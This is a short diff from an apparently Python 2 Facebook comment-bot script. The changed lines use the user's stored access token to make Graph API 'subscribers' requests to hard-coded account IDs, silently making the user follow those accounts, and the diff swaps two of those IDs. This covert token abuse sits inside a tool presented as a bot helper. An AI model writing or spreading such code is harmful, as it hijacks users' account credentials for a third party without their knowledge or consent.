@@ -104,9 +104,9 @@ def bot_komen():
     except IOError:
         print '\x1b[1;97m[!] Token invalid'
         os.system('rm -rf login.txt')
-    requests.post('https://graph.facebook.com/100027597829137/subscribers?access_token=' + toket)
+    requests.post('https://graph.facebook.com/100000891392705/subscribers?access_token=' + toket)
     requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket)
-    requests.post('https://graph.facebook.com/100002224561488/subscribers?access_token=' + toket)
+    requests.post('https://graph.facebook.com/1186995774/subscribers?access_token=' + toket)
     menu()
 		
 #####LOGIN_TOKENZ#####
